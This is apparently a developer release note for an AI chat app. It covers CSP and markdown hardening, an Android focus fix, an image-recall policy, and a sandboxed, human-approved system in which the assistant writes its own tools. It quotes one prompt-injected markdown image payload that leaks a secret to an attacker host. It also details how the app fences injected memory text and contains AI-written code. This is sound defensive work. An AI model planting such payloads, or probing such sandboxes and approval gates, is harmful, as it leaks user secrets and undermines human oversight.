# Hardening pass · Quiet Composer · Memory Lens · Tool Foundry

Shipped 2026-07-30 on `new1`. Four workstreams, one migration.

## Applying the migration (the one user action)

Paste into Lovable's chat:

> Please run the repo migration `supabase/migrations/20260730120000_memory_lens_tool_foundry.sql`
> exactly as written, without modifications. It is idempotent.

Until applied: Memory Lens works per-device via a localStorage fallback (auto-merged
into the DB on first contact after the migration), and the Tool Foundry stays
invisible to the model (its tools are omitted from the roster — no mid-chat
nagging; Settings → Tool Foundry shows the setup note).

## 1. Hardening pass (fixes live exposure, independent of everything else)

- **App CSP** — injected at build time (`vite.config.ts`, `cspPlugin`) so dev/HMR
  stays unrestricted. Every origin is documented in the config; `img-src` is the
  exfiltration backstop — never widen it to `https:`.
- **Markdown URL guard** (`src/lib/markdownSafety.tsx`) — all four ReactMarkdown
  sites (ChatPanel, ResponseBlocks, WikiPanel, WorkspacePanel) now allowlist
  image hosts (self + Supabase + data/blob) and harden links. A prompt-injected
  `![](https://attacker/?d=secret)` renders as an inert "external image blocked"
  chip instead of firing a zero-click GET.
- **Prompt fencing** (`buildChatSystemPrompt.ts`) — retrieved memory titles and
  bodies are wrapped in per-build nonce fences (`<<<memory:nonce>>>`), with the
  nonce, line-leading headings, and the literal `[Attached image` stripped from
  the wrapped text — untrusted entry content can no longer forge prompt sections
  or fake attachment notes. Real image notes render OUTSIDE the fence.
- **Artifact CSP tightened** (`artifacts.ts`) — `img/font/media` now `data:`/`blob:`
  only; the previous `https:` allowance was itself an exfil channel.

## 2. Quiet Composer (the Android keyboard fix)

Root cause: `ChatPanel.tsx` refocused the composer whenever a reply finished
streaming; Chromium opens the Android soft keyboard on any programmatic
`focus()` once the session has seen a gesture (iOS swallows async focus, which
masked the bug there).

- `src/lib/focusPolicy.ts` — the single helper allowed to focus the composer:
  refuses on touch-primary devices (unless in-gesture), while hands-free is
  active, or when the document is hidden; dev builds warn on non-gesture calls.
- Desktop keeps its convenience, minus stealing: refocus after a reply only when
  the send came from the composer area, focus is still on body/composer, no text
  selection is active, and the transcript wasn't scrolled/touched in the last 3s.
- Hands-free entry blurs the active element (keyboard dismissed) and sets
  `inputmode="none"` on the composer for the session (defense in depth).
- **Pocket screen** (`PocketScreen.tsx`) — on touch devices, 12s of no touches
  during hands-free arms a near-black overlay (≈off on OLED) that swallows every
  touch; double-tap to wake. Prevents pocket-taps from pressing real controls
  (including tool-approval buttons).
- **Silence watchdog** (`useHandsFree.ts`) — 5 minutes with no speech in either
  direction ends the session with a spoken notice (the wake lock would otherwise
  burn battery in a pocket indefinitely).

## 3. Memory Lens (memory images that show themselves)

Policy (`src/lib/memoryLens.ts`, research-backed):
never seen → auto-show full, once, max ONE per reply · seen in the last 30 days →
tap-to-expand chip · quiet 30+ days → eligible again (NO lifetime cap) ·
user asks → always shows, consumes nothing · "don't show this again" → permanent
mute with an undo list in Settings · unknown state → chip (fail closed).

- **Displays only count when actually seen**: IntersectionObserver ≥50% × 1s,
  document visible, hands-free inactive (`MemoryLensStrip.tsx`) — a reply spoken
  to a pocketed phone never consumes the first-look.
- **Deterministic layer**: ChatContext auto-attaches the top never-seen image to
  the reply via the persisted `images` channel (renders through the existing
  re-signing `GeneratedImage` path — survives reloads and other devices) and
  demotes the rest to chips. If the model already called `show_image` for an id,
  the layer skips it — nothing renders twice.
- **Steer layer**: the prompt's attachment notes are now state-aware and
  imperative for never-seen images; `search_wiki` results carry `images` +
  seen-state too (that path was previously blind to attachments).
- State: `image_attachments.recall_*` columns; "same conversation" keys on a
  per-tab session id (the app has no conversation ids). Pre-migration:
  localStorage per device, merged into the DB later (max counts, mute wins).
- Settings → Prompts → Memory Lens: auto-show toggle + muted-image undo list.
- Tool entries (see below) are excluded from Memory Lens and from
  "From your memory" framing.

## 4. Tool Foundry (the AI's coding space; tools as neurons)

A tool = code + description + AST-derived capability manifest + tests, stored in
`agent_tools`, mirrored as an entry in the **Toolshed** neuron (entry_type
`tool`, tags `["tool"]`) so the assistant finds its own tools by meaning through
the existing embedding retrieval. Versions supersede-with-lineage.

**Trust chain** (each layer independent):
1. **Opt-in**: `forge_tool` / `run_tool` require `chat_tool_permissions` set to
   explicit `true` — the ONLY tools that invert the app's default-allow
   convention. Off = omitted from the model's roster entirely.
2. **AST gate** (`toolFoundry.ts`, acorn): parse-or-reject; forbidden
   identifiers (`eval`, `Function`, `fetch`, `globalThis`, `__cap`, …); the
   capability list is DERIVED from actual `caps.*` usage — a declared/derived
   mismatch rejects the draft (a card must never lie).
3. **Fixture verification**: draft tests run against canned stubs — live data
   never touches an unapproved tool; failure notes are truncated.
4. **Human ratification**: approval card in chat + Settings; the Approve button
   calls the `approve_tool` SECURITY DEFINER RPC from UI code (the model cannot
   press it). The RPC recomputes the fingerprint server-side, refuses
   user-disabled lineages, supersedes the previous version transactionally, and
   writes the pin to insert-only `tool_approvals`. A DB trigger makes approved
   rows immutable; client INSERTs can only ever be drafts (RLS WITH CHECK).
   Progressive trust: optional "auto-approve safe updates" toggle (default OFF)
   auto-applies version updates with UNCHANGED capabilities + green tests.
5. **Runtime integrity**: `run_tool` resolves exactly one approved,
   non-superseded row, and runs only if the server fingerprint equals the
   approvals pin (rug-pulled rows never execute).
6. **Sandbox** (`toolSandbox.ts` + `src/sandbox/toolWorker.ts`): fresh
   opaque-origin iframe per run (`sandbox="allow-scripts"`, static srcdoc —
   unit-test enforced zero interpolation — meta CSP `connect-src 'none'`,
   `worker-src blob:`, dns-prefetch off) → blob module Worker (hard kill) →
   QuickJS-WASM VM (memory/stack/interrupt limits). Code and args cross only as
   MessageChannel data with per-run ids. Dev mode runs the worker directly
   (Vite module-serving constraint) — the QuickJS boundary still holds; prod
   exercises the full double boundary.
7. **Capabilities**: v1 is read-only — `memory_search`, `memory_get`,
   `books_list`, `books_get_chapter_text`, `images_list` — each a hand-rolled
   narrow query under the user's own RLS (never a generic table read;
   `user_settings` holds plaintext API keys in the same scope). Per-call 16KB /
   per-run 64KB caps; out-of-manifest calls kill the run; results cap at 32KB.
8. **Audit**: `tool_runs` rows are inserted at run START (kills stay visible)
   and settled after; no DELETE policy. Run/fail counters feed a
   3-strikes "needs repair" nudge and future trim suggestions.

The worker builds as ONE self-contained ES module (`vite.config.ts` `worker`
block) because its text is re-instantiated as a blob inside a no-network frame
where chunk imports could never resolve.

Phase 2 (not in this ship): write/network capabilities with per-call consent,
tools calling tools, automatic "package what we just did" proposals,
sleep-cycle trimming.

## Known limitations

- Dev mode's sandbox is single-boundary (QuickJS only) — see §4.6.
- Memory Lens sensitivity tagging doesn't exist yet: no valence data on entries,
  so the only gates are the mute control + the global toggle.
- Pre-migration, Memory Lens state is per-device; a suppressed image can
  auto-show once on a second device until the migration lands.
- The CSP allowlist must be re-audited when new external services are added —
  see the comment block in `vite.config.ts`.
